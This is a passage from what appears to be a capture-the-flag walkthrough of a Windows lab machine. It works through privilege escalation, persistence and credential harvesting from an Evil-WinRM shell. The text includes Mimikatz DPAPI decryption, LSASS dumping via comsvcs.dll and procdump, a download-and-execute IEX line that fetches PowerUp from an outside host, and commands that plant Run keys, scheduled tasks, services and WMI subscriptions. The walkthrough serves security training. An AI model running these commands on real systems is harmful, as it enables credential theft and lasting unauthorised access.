*Evil-WinRM* PS C:\Temp> upload exploit.msi
*Evil-WinRM* PS C:\Temp> msiexec /quiet /qn /i exploit.msi

# Check for flag
*Evil-WinRM* PS C:\Temp> Get-Content C:\msi_flag.txt
FLAG{W************5}
```

**FLAG 13 FOUND**: FLAG{W**********5} - AlwaysInstallElevated

**Why This Works**: When AlwaysInstallElevated is set, ANY user can install MSI packages with SYSTEM privileges!

### FLAG 14: Print Spooler Vulnerability

**Location**: Spooler directory  
**Difficulty**: Hard

```powershell
# Check Print Spooler status and permissions
*Evil-WinRM* PS C:\> Get-Service Spooler | Select-Object *

Status      : Running
Name        : Spooler
DisplayName : Print Spooler

*Evil-WinRM* PS C:\> icacls "C:\Windows\System32\spool\drivers\color"

C:\Windows\System32\spool\drivers\color Everyone:(OI)(CI)F
                                         NT AUTHORITY\SYSTEM:(I)(OI)(CI)F
                                         BUILTIN\Administrators:(I)(OI)(CI)F

Successfully processed 1 files; Failed processing 0 files

# Everyone has Full control (F) - Vulnerable to PrintNightmare!

*Evil-WinRM* PS C:\> Get-ChildItem "C:\Windows\System32\spool\drivers\color"

    Directory: C:\Windows\System32\spool\drivers\color

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/5/2025   10:15 AM             24 workstation_spooler_flag.txt

*Evil-WinRM* PS C:\> Get-Content "C:\Windows\System32\spool\drivers\color\workstation_spooler_flag.txt"
FLAG{G*************5}
```

**FLAG 14 FOUND**: FLAG{G**********5} - Print Spooler vulnerability

**Real-World Impact**: This represents PrintNightmare (CVE-2021-34527), a critical vulnerability that affected all Windows versions!

---

## Phase 6: Persistence Mechanisms

### Understanding Persistence

**Why Persistence Matters**:
- Maintain access after reboots
- Survive password changes
- Enable re-entry if discovered
- Establish command & control

### FLAG 15: Startup Folder

**Location**: Startup script  
**Difficulty**: Medium

```powershell
# Check user startup folder
*Evil-WinRM* PS C:\> $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
*Evil-WinRM* PS C:\> Get-ChildItem $startupPath

    Directory: C:\Users\jsmith\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/5/2025   10:15 AM            156 update.bat

*Evil-WinRM* PS C:\> Get-Content "$startupPath\update.bat"
REM Startup Script
REM Flag: FLAG{V************1}
powershell.exe -WindowStyle Hidden -Command "Write-Host 'Vulnerable startup script'"
```

**FLAG 15 FOUND**: FLAG{V**********1} - Startup folder

**Startup Folder Locations**:
```powershell
# User-specific (runs when user logs in)
$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup

# All users (runs for any user login)
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

### FLAG 16: Registry Run Key

**Location**: Registry persistence  
**Difficulty**: Medium

```powershell
# Check Run keys for persistence
*Evil-WinRM* PS C:\> reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    UpdaterFlag    REG_SZ    cmd /c echo FLAG{P*************5} > C:\Windows\Temp\regflag.txt
    Updater        REG_SZ    C:\ProgramData\update.exe

# Execute the command to get the flag
*Evil-WinRM* PS C:\> cmd /c echo FLAG{P**************5} > C:\Windows\Temp\regflag.txt
*Evil-WinRM* PS C:\> Get-Content C:\Windows\Temp\regflag.txt
FLAG{P**************5}
```

**FLAG 16 FOUND**: FLAG{P**********5} - Registry Run key

**Common Registry Persistence Locations**:
```powershell
# Current User (runs for specific user)
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

# Local Machine (runs for all users)
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

# Services (runs as SYSTEM)
HKLM\System\CurrentControlSet\Services
```

### FLAG 17: Scheduled Task

**Location**: Task output  
**Difficulty**: Medium

```powershell
# List all scheduled tasks
*Evil-WinRM* PS C:\> Get-ScheduledTask | Where-Object {$_.TaskName -like "*Daily*" -or $_.TaskName -like "*Update*"}

TaskPath                          TaskName          State
--------                          --------          -----
\                                 DailyUpdate       Ready

# Get task details
*Evil-WinRM* PS C:\> Get-ScheduledTask -TaskName DailyUpdate | Select-Object -ExpandProperty Actions

Id               : 
Arguments        : /c echo FLAG{V***********0} > C:\temp\task_ws.txt
Execute          : cmd.exe
WorkingDirectory : 

# Run the task manually
*Evil-WinRM* PS C:\> Start-ScheduledTask -TaskName DailyUpdate

# Wait a moment for execution
*Evil-WinRM* PS C:\> Start-Sleep -Seconds 2
*Evil-WinRM* PS C:\> Get-Content C:\temp\task_ws.txt
FLAG{V************0}
```

**FLAG 17 FOUND**: FLAG{V**********0} - Scheduled task

**Why Scheduled Tasks for Persistence**:
- Survive reboots
- Run at specific times/events
- Can run as SYSTEM
- Less obvious than Run keys

---

## Phase 7: Credential Storage

### Understanding Credential Storage on Workstations

**Where Users Store Credentials**:
- Text files (passwords.txt)
- Excel spreadsheets
- Browser password managers
- Windows Credential Manager
- Sticky Notes
- PowerShell credential files

### FLAG 18: VPN Configuration

**Location**: Credentials folder  
**Difficulty**: Medium

```powershell
# Search for VPN configurations
*Evil-WinRM* PS C:\> Get-ChildItem -Path C:\Users -Include "*vpn*" -Recurse -ErrorAction SilentlyContinue | Select-Object FullName

FullName
--------
C:\Users\Public\Documents\Credentials\vpn.txt

*Evil-WinRM* PS C:\> Get-Content C:\Users\Public\Documents\Credentials\vpn.txt
VPN Configuration
=================
Server: vpn.overclock.io
Port: 1194
Protocol: OpenVPN
Username: jsmith
Password: Welcome1
Shared Secret: S3cur3VPN2025
Flag: FLAG{D***********9}
```

**FLAG 18 FOUND**: FLAG{D**********9} - VPN configuration

**Why VPN Configs Are Sensitive**:
- Contains authentication credentials
- Reveals network architecture
- Provides external access routes
- Often reused passwords

### FLAG 19: PowerShell Credential Object

**Location**: XML credential file  
**Difficulty**: Medium

```powershell
# Find PowerShell credential files
*Evil-WinRM* PS C:\> Get-ChildItem -Path C:\Users -Filter "*.xml" -Recurse -ErrorAction SilentlyContinue | Select-String "PSCredential" | Select-Object Path

Path
----
C:\Users\Public\Documents\Credentials\admin.xml

*Evil-WinRM* PS C:\> Get-Content C:\Users\Public\Documents\Credentials\admin.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Administrator</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000...</SS>
    </Props>
  </Obj>
</Objs>
<!-- Flag: FLAG{P***********9} -->
```

**FLAG 19 FOUND**: FLAG{P**********9} - PowerShell credential

**Decrypting PowerShell Credentials**:
```powershell
# If you're the same user who created it:
$cred = Import-Clixml C:\Users\Public\Documents\Credentials\admin.xml
$cred.GetNetworkCredential().Password
```

---

## Phase 8: Documents and Applications

### Understanding Document-Based Attacks

**Why Documents Matter**:
- Macros can execute code
- Metadata reveals information
- Users trust documents
- Often contain sensitive data

### FLAG 20: Macro Document

**Location**: Office document with macros  
**Difficulty**: Easy

```powershell
# Find macro-enabled documents
*Evil-WinRM* PS C:\> Get-ChildItem -Path C:\Users -Include "*.docm","*.xlsm" -Recurse -ErrorAction SilentlyContinue

    Directory: C:\Users\Public\Documents\Important

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/5/2025   10:15 AM          12453 Invoice.docm

# Extract strings from the document
*Evil-WinRM* PS C:\> $content = Get-Content C:\Users\Public\Documents\Important\Invoice.docm -Encoding Byte
*Evil-WinRM* PS C:\> [System.Text.Encoding]::ASCII.GetString($content) | Select-String "FLAG"

This document contains macros that run automatically
Macro Code: Sub AutoOpen()
' Flag: FLAG{G***********8}
End Sub
```

**FLAG 20 FOUND**: FLAG{G**********8} - Macro document

**Real-World Macro Threats**:
- AutoOpen/AutoExec runs on document open
- Can download and execute payloads
- Bypass many security controls
- Users often enable macros

### FLAG 21: HTA Application

**Location**: HTA file  
**Difficulty**: Medium

```powershell
# Find HTA files
*Evil-WinRM* PS C:\> Get-ChildItem -Path C:\Users -Filter "*.hta" -Recurse -ErrorAction SilentlyContinue

    Directory: C:\Users\Public\Documents\Important

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/5/2025   10:15 AM            534 portal.hta

*Evil-WinRM* PS C:\> Get-Content C:\Users\Public\Documents\Important\portal.hta
<html>
<head>
<!-- Flag: FLAG{P************5} -->
<script language="VBScript">
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "cmd.exe /c echo Vulnerable HTA executed > C:\temp\hta.txt", 0, True
</script>
</head>
<body>
    <h1>Company Portal</h1>
    <p>Welcome to the internal portal</p>
</body>
</html>
```

**FLAG 21 FOUND**: FLAG{P**********5} - HTA application

**Why HTA Files Are Dangerous**:
- Execute with full user privileges
- Bypass many security controls
- Look like harmless web pages
- Can run VBScript/JavaScript

### FLAG 22: DLL Hijacking Path

**Location**: Writable PATH directory  
**Difficulty**: Hard

```powershell
# Check PATH for writable directories
*Evil-WinRM* PS C:\> $env:Path -split ';' | ForEach-Object { 
    if(Test-Path $_) {
        $acl = Get-Acl $_
        if($acl.Access | Where-Object {$_.IdentityReference -match "Everyone" -and $_.FileSystemRights -match "FullControl"}) {
            Write-Host "WRITABLE: $_" -ForegroundColor Red
            Get-ChildItem $_ 2>$null
        }
    }
}

WRITABLE: C:\ProgramData\Custom

    Directory: C:\ProgramData\Custom

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/5/2025   10:15 AM            123 readme.txt

*Evil-WinRM* PS C:\> Get-Content C:\ProgramData\Custom\readme.txt
REM DLL Hijacking POC
REM Any DLL placed here will be loaded before system DLLs
REM Flag: FLAG{G************9}
```

**FLAG 22 FOUND**: FLAG{G**********9} - DLL hijack path

**DLL Hijacking Explained**:
1. Windows searches for DLLs in PATH order
2. If we control an early PATH directory
3. We can place malicious DLLs there
4. Programs load our DLL instead of the legitimate one

---

## Phase 9: User Data and Artifacts

### Understanding User Artifacts

**Why User Artifacts Matter**:
- Users leave traces everywhere
- Clipboard, shortcuts, deleted files
- Temporary data persists
- Users don't know these exist

### FLAG 23: Desktop Shortcut Properties

**Location**: Shortcut metadata  
**Difficulty**: Easy

```powershell
# Analyze desktop shortcuts
*Evil-WinRM* PS C:\> $WshShell = New-Object -ComObject WScript.Shell
*Evil-WinRM* PS C:\> $shortcuts = Get-ChildItem "C:\Users\Public\Desktop\*.lnk"
*Evil-WinRM* PS C:\> foreach($shortcut in $shortcuts) {
    $sh = $WshShell.CreateShortcut($shortcut.FullName)
    Write-Host "Shortcut: $($shortcut.Name)"
    Write-Host "Target: $($sh.TargetPath)"
    Write-Host "Description: $($sh.Description)"
    Write-Host "---"
}

Shortcut: Server Shares.lnk
Target: \\WIN2019-SRV
Description: Connect to server - Flag: FLAG{P***********0}
---
```

**FLAG 23 FOUND**: FLAG{P**********0} - Desktop shortcut

**Shortcut Intelligence**:
- Reveals network shares
- Contains descriptions/comments
- Shows recently accessed resources
- May contain credentials in arguments

### FLAG 24: Clipboard Content

**Location**: Current clipboard  
**Difficulty**: Easy

```powershell
# Get current clipboard content
*Evil-WinRM* PS C:\> Get-Clipboard
FLAG{K**********8}

# Alternative method
*Evil-WinRM* PS C:\> Add-Type -AssemblyName System.Windows.Forms
*Evil-WinRM* PS C:\> [System.Windows.Forms.Clipboard]::GetText()
FLAG{K**********8}
```

**FLAG 24 FOUND**: FLAG{K**********8} - Clipboard content

**Why Clipboard Matters**:
- Users copy passwords
- Contains recent activity
- Persists across applications
- Often forgotten by users

### FLAG 25: Recycle Bin

**Location**: Deleted file  
**Difficulty**: Medium

```powershell
# Method 1: Direct Recycle Bin access
*Evil-WinRM* PS C:\> $recycleBin = (New-Object -ComObject Shell.Application).NameSpace(10)
*Evil-WinRM* PS C:\> $recycleBin.Items() | ForEach-Object { 
    Write-Host "Deleted File: $($_.Name)"
    if($_.Name -like "*flag*") {
        Write-Host "Found flag file!" -ForegroundColor Green
    }
}

Deleted File: deleted_flag.txt
Found flag file!
Deleted File: old_passwords.xlsx
Deleted File: temp.doc

# Method 2: Direct filesystem access
*Evil-WinRM* PS C:\> Get-ChildItem 'C:\$Recycle.Bin' -Recurse -Force | Where-Object {$_.Name -like "*flag*"}

    Directory: C:\$Recycle.Bin\S-1-5-21-xxx-xxx-xxx-1001

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/5/2025   10:00 AM             22 $RABC123.txt

*Evil-WinRM* PS C:\> Get-Content 'C:\$Recycle.Bin\S-1-5-21-xxx-xxx-xxx-1001\$RABC123.txt'
FLAG{M***********9}
```

**FLAG 25 FOUND**: FLAG{M**********9} - Recycle Bin

**Recycle Bin Intelligence**:
- Deleted files aren't gone
- Contains sensitive documents
- Reveals user activity
- Can be recovered easily

### FLAG 26: Sticky Notes

**Location**: Sticky Notes database  
**Difficulty**: Medium

```powershell
# Navigate to Sticky Notes location
*Evil-WinRM* PS C:\> $stickyPath = "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState"
*Evil-WinRM* PS C:\> Get-ChildItem $stickyPath

    Directory: C:\Users\jsmith\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/5/2025   10:15 AM          32768 plum.sqlite
-a----         9/5/2025   10:15 AM           8192 plum.sqlite-shm
-a----         9/5/2025   10:15 AM          32768 plum.sqlite-wal

# Read the SQLite database (contains sticky notes)
*Evil-WinRM* PS C:\> $content = Get-Content "$stickyPath\plum.sqlite" -Encoding UTF8
*Evil-WinRM* PS C:\> $content | Select-String "FLAG"

SQLite format 3
Sticky Note: Remember the flag is FLAG{W***********3}
Password for admin: Password123!
Meeting at 3pm tomorrow
```

**FLAG 26 FOUND**: FLAG{W**********3} - Sticky Notes

**Why Sticky Notes Are Gold**:
- Users write passwords
- Contains reminders
- Persists between sessions
- Stored in SQLite database

### FLAG 27: DPAPI Protected Data

**Location**: DPAPI encrypted file  
**Difficulty**: Hard

```powershell
# Find DPAPI encrypted files
*Evil-WinRM* PS C:\> Get-ChildItem C:\Users -Include "*.bin","*.blob" -Recurse -ErrorAction SilentlyContinue

    Directory: C:\Users\Public\Documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/5/2025   10:15 AM            256 dpapi_flag.bin

# Method 1: Using Mimikatz to decrypt
*Evil-WinRM* PS C:\Temp> .\mimikatz.exe

mimikatz # dpapi::blob /in:C:\Users\Public\Documents\dpapi_flag.bin
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  dwFlags            : 00000000 - 0
  dwDescriptionLen   : 0000000e - 14
  szDescription      : flag data
  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : [...]
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 0000800e - 32782 (CALG_SHA_256)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : [...]
  dwDataLen          : 00000030 - 48
  pbData             : [...]

Decrypted data: FLAG{T************3}
```

**FLAG 27 FOUND**: FLAG{T**********3} - DPAPI blob

**Alternative DPAPI Decryption**:
```powershell
# If running as the user who encrypted it
Add-Type -AssemblyName System.Security
$encryptedBytes = [System.IO.File]::ReadAllBytes("C:\Users\Public\Documents\dpapi_flag.bin")
$decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Text.Encoding]::UTF8.GetString($decryptedBytes)
```

**Why DPAPI Matters**:
- Windows uses it for all user encryption
- Chrome passwords
- Credential Manager
- EFS certificates
- WiFi passwords

---

## Advanced Techniques and Alternative Approaches

### Automated Enumeration

#### Using WinPEAS for Comprehensive Enumeration

```powershell
# Upload and run WinPEAS
*Evil-WinRM* PS C:\Temp> upload winPEASx64.exe
*Evil-WinRM* PS C:\Temp> .\winPEASx64.exe systeminfo userinfo

     =========================================
     |      ((,.,/((.,(,,,                  |
     |     ,..,(#%#((((((//,,,.              |
     |   //////************/####//          |
     |  #######**********(#######(          |
     | ################(//#######/          |
     | ###############(#########(           |
     | ########(#######/########/           |
     | ##################(#####(            |
     | #####################(               |
     |      /##########(((((                |
     |          ((#######((                 |
     |            ((####(                   |
     =========================================
     ADVISORY: WinPEAS - Windows Privilege Escalation Awesome Scripts

[+] Checking Unquoted Service Paths
    FakeAntivirus: C:\Program Files\Antivirus Software\Engine\av.exe
    BackupManager: C:\Program Files\Backup Manager\Service\backup.exe
    RemoteSupportAgent: C:\Program Files (x86)\Remote Support Tool\Agent\agent.exe

[+] Checking AlwaysInstallElevated
    HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
    HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
    [!] Both values are 1 - VULNERABLE!

[+] Checking Stored Credentials
    Currently stored credentials:
    Target: WIN2019-SRV
    UserName: Administrator
```

#### Using PowerUp for Privilege Escalation

```powershell
# Import and run PowerUp
*Evil-WinRM* PS C:\Temp> IEX(New-Object Net.WebClient).downloadString('http://192.168.148.99:8000/PowerUp.ps1')
*Evil-WinRM* PS C:\Temp> Invoke-AllChecks

[*] Running Invoke-AllChecks

[*] Checking for unquoted service paths...
ServiceName    : FakeAntivirus
Path           : C:\Program Files\Antivirus Software\Engine\av.exe
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -ServiceName 'FakeAntivirus' -Path 'C:\Program Files\Antivirus.exe'

[*] Checking for AlwaysInstallElevated registry key...
AbuseFunction  : Write-UserAddMSI
```

### Living Off the Land Techniques

#### LSASS Dump Without External Tools

```powershell
# Method 1: Task Manager (GUI only)
# Right-click lsass.exe → Create dump file

# Method 2: Comsvcs.dll (Native Windows)
*Evil-WinRM* PS C:\Temp> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1473      29    12436      58412       0.84    656   0 lsass

*Evil-WinRM* PS C:\Temp> rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 656 C:\Temp\lsass.dmp full

# Method 3: Using ProcDump (Signed by Microsoft)
*Evil-WinRM* PS C:\Temp> .\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### Persistence Techniques

#### Creating Multiple Persistence Methods

```powershell
# 1. Registry Run Key
*Evil-WinRM* PS C:\> New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityUpdate" -Value "C:\ProgramData\update.exe" -PropertyType String -Force

# 2. Scheduled Task
*Evil-WinRM* PS C:\> $action = New-ScheduledTaskAction -Execute "C:\ProgramData\beacon.exe"
*Evil-WinRM* PS C:\> $trigger = New-ScheduledTaskTrigger -AtStartup
*Evil-WinRM* PS C:\> Register-ScheduledTask -TaskName "SystemHealthCheck" -Action $action -Trigger $trigger -RunLevel Highest

# 3. Service Creation
*Evil-WinRM* PS C:\> New-Service -Name "WindowsHealthService" -BinaryPathName "C:\ProgramData\service.exe" -StartupType Automatic

# 4. WMI Event Subscription
*Evil-WinRM* PS C:\> $filterName = "ProcessFilter"
*Evil-WinRM* PS C:\> $consumerName = "ProcessConsumer"
*Evil-WinRM* PS C:\> $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
*Evil-WinRM* PS C:\> $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query}
```
